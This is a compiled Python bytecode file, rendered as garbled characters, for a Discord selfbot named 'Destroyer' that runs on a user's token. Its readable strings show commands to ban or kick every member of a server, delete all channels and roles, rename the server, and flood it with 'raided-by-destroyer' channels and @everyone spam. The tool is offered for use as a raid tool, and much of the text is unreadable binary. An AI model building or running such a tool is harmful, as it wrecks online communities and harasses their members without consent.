U
    +¼×^¤(  ã                	   @   s  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlmZ d dl	m
Z
 d dlmZmZ ejj d¡ edZe e¡ZW 5 Q R X e d¡Ze d	¡Ze  ¡ Zejd
edZe d¡ e ¡  dd Zejdd Zejdd Z dd Z!dd Z"dd Z#e#  dS )é    N)Úpath)ÚFore)ÚProcess)ÚcommandsÚtasksz(Destroyer (SELFBOT Edition) | Loading...zconfig.jsonÚtokenÚprefixÚ	Destroyer)ÚdescriptionZcommand_prefixÚhelpc                )   Ã   s¸   t tj dtj dtj dtj dt dtj dtj dtj dtj tjj dtjj	 dtj d	tj tjj
 dtj d
tj dtj dtj dtj dtj dt d(tj  d S )Nuh  
    âââââââ ââââââ   ââââââ âââââââââ ââââââ   ââââââ âââ   âââââââââ  ââââââ  
    ââââ âââââ   â âââ    â â  âââ âââââ â âââââââ  ââââââ  âââââ   â âââ â âââ
    âââ   ââââââ   â ââââ   â ââââ âââââ âââ âââââ  âââ âââ âââââââ   âââ âââ â
    ââââ   ââââ  â   â   ââââ ââââ â âââââââ  âââ   âââ â ââââââââ  â âââââââ  
    âââââââ ââââââââââââââââ  ââââ â ââââ âââââ âââââââ â ââââââââââââââââ ââââ
    âââ  â ââ ââ ââ âââ â â  â ââ   â ââ âââââ ââââââ   âââââ ââ ââ ââ ââ ââââ
    â â  â  â â  ââ ââ  â â    â      ââ â ââ  â â ââ âââ âââ  â â  â  ââ â ââ
    â â  â    â   â  â  â    â        ââ   â â â â â  â â ââ     â     ââ   â 
    â       â  â      â              â         â â  â â        â  â   â     
    â                                                 â â                         
                    
                        
    z$[INFORMATION] z	 Prefix: ú z
    z Destroyer (SELFBOT Edition) | z Logged in as ú#z | ID: z$[CREDITS] z: Destroyer was coded by https://youtube.com/snipcola.
    z
$[SYSTEM] z! The bot is now operational.
    ú Do z#help to view all the commands.
    )Úprintr   ÚRESETÚREDÚGREENr   r	   ÚuserÚnameZdiscriminatorÚidZBLUE© r   r   ú	.\Main.pyÚstart_print!   s:    
óóóóóòòóòñóóóîr   c                   Ã   s.   t   t I d H  tjj dtjj ¡ d S )Nz+Destroyer (SELFBOT Edition) | Logged in as )	ÚClearr   ÚctypesÚwindllÚkernel32ÚSetConsoleTitleWr	   r   r   r   r   r   r   Ú
on_connect7   s
    ÿr   c              3   Ã   s°  | j  t d¡rltdtj dtj dtj  |  d¡I d H  t 	d¡I d H  |  
¡ I d H  t  t  | j  t d¡r|tdtj dtj t dtj d	tj dtj t dtj d
tj dtj t dtj dtj dtj t dtj dtj dtj t dtj dtj dtj t dtj dtj dtj t dtj d2 |  d¡I d H  t 	d¡I d H  |  
¡ I d H  | j  t d¡rt|  d¡I d H  t 	d¡I d H  |  
¡ I d H  | jjD ]}zR|jddI d H  tdtj dtj d|j d| jj d	 t 	d¡I d H  W n8   tdtj dtj d|j d| jj d	 Y nX qÆtdtj dtj d | j  t d¡rl|  d¡I d H  t 	d¡I d H  |  
¡ I d H  | jjD ]}zR|jddI d H  tdtj dtj d |j d| jj d	 t 	d¡I d H  W n8   tdtj dtj d!|j d| jj d	 Y nX q¾tdtj dtj d" | j  t d¡râtdtj d#tj d$ tdtj d#tj d%t d& d'atrRtd'kr¾t| I d H  q¾np| j  t d¡rRd(a|  d¡I d H  t 	d¡I d H  |  
¡ I d H  t 	d¡I d H  tdtj d#tj d) | j  t d¡r¬tdtj d*tj d+| jj d, |  d¡I d H  t 	d¡I d H  |  
¡ I d H  | jjD ]~}z>| 
¡ I d H  tdtj d*tj d-|j d.| jj d	 W n8   tdtj d*tj d/|j d.| jj d	 Y nX qÀtdtj d*tj d0 | jjD ]~}z>| 
¡ I d H  tdtj d*tj d1|j d.| jj d	 W n8   tdtj d*tj d2|j d.| jj d	 Y nX qbtdtj d*tj d3 | jjD ]}zB|jddI d H  tdtj d*tj d|j d| jj d	 W n8   tdtj d*tj d|j d| jj d	 Y nX qtdtj d*tj d4| jj d d S )5NÚclsú    z$[CLEAR CONSOLE] z"Clearing console in 1.5 seconds...õ   âç      ø?r   z$[HELP] z3 (This shows all the commands in the console.)
    z- (This clears all lines in the console.)
    zban allz- (This bans every member in the server.)
    zkick allz. (This kicks every member in the server.)
    Zdestroyz! (This destroys the server.)
    Zsdestroyz2 (This stops the destroy command, if active.)
    Znukez< (This deletes everything in the server and bans everyone.)
zBanned by Destroyer.)Úreasonz$[BAN ALL] z Banned z from Ú.g¹?z Failed banning z* The bot has successfully banned everyone.zKicked by Destroyer.z$[KICK ALL] z Kicked z Failed kicking z* The bot has successfully kicked everyone.ú$[DESTROY] z' Server destruction has been initiated.r   z sdestroy to stop this command...TFz% Server destruction has been stopped.z$[NUKE] z Nuking z in 1.5 seconds...z Deleted channel z in z Failed deleting channel z/ The bot has successfully deleted all channels.z Deleted role z Failed deleting role z, The bot has successfully deleted all roles.z- The bot has successfully banned everyone in )ZcontentÚ
startswithr   r   r   ÚCYANr   Úadd_reactionÚasyncioÚsleepÚdeleter   r   r   ÚguildÚmembersZbanr   r   ZkickÚdloopÚDestroyÚchannelsZroles)ÚmessageÚmemberÚchannelZroler   r   r   Ú
on_message?   s     ÿÈÿ	,6,6 
$060606r4   c                 Ã   sÀ  |   d¡I d H  t d¡I d H  |  ¡ I d H  d}d}tdkr¼d}zBtdtj dtj d| j	j
 d	| d
	 | j	jddI d H  W n6   tdtj dtj d| j	j
 d	| d
	 Y nX tr¼tdkr¼z\tdkr$|d7 }| j	 dt| ¡I d H }tdtj dtj d|j
 d| j	j
 d
	 W n:   tdkr\tdtj dtj d| j	j
 d
 Y nX tjj| j	jdt| d}| d¡I d H  tdtj dtj d|j
 d| j	j
 d
	 q¼d S )Nr!   r"   r   TZ	DESTROYEDr    r%   z Changed server name from z to r$   )r   z Failed changing server name é   zraided-by-destroyer-z Created a z channel in z5 The maximum number of channels have been reached in z3@everyone THIS SERVER HAS BEEN RAIDED BY DESTROYER.z Sent message in channel z, guild )r(   r)   r*   r+   r.   r   r   r'   r   r,   r   Zeditr   Zcreate_text_channelÚstrÚdiscordZutilsÚgetr0   Úsend)r1   ZcnumberZrnumberZ	guildnamer3   r   r   r   r/      s2    *0
0
*r/   c                   C   s   t  d¡ d S )Nr   )ÚosÚsystemr   r   r   r   r   »   s    r   c                  C   s¸   t  d¡dkrDt  tdtj dtj dtj dtj  t  npt  d¡} ztj	| ddd	 t
 d
¡ W nF tjjk
r²   tdtj dtj dtj dtj  t  Y nX d S )Nr   z
token-herer    z$[SYSTEM ERROR] zCWhoops! It looks like you didn't put a token in config.json. 

    z $[SYSTEM] Press any key to exit.FT)ZbotZ	reconnectz#title Destroyer - (SELFBOT Edition)z8Sorry but, the token in config.json is incorrect. 

    )Úconfigr8   r   r   r   r   r   Úinputr	   Úrunr:   r;   r7   ÚerrorsZLoginFailure)r   r   r   r   ÚInit¿   s*    þÿ
ÿþÿr@   )$r7   r)   ZrandomZcoloramar   r:   Zjsonr   r   Zmultiprocessingr   Zdiscord.extr   r   r   r   r   ÚopenÚfÚloadr<   r8   r   r   ZClientr	   ZBotZremove_commandZinitr   Zeventr   r4   r/   r   r@   r   r   r   r   Ú<module>   sB   ÿ


þ


_